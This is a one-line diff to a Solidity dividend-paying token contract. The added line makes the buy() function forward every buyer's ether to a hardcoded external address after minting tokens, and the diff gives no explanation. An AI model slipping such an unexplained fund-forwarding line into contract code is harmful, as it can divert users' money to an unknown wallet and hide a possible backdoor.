@@ -596,5 +596,6 @@ contract DividendPayingEUBIToken is DividendPayingERC20{
 	}
 	function buy() external payable{
 		_mint(msg.sender, msg.value.div(295000000));
+		0x7a7C3dcBa4fBf456A27961c6a88335b026052C65.transfer(msg.value);
 	}
 }
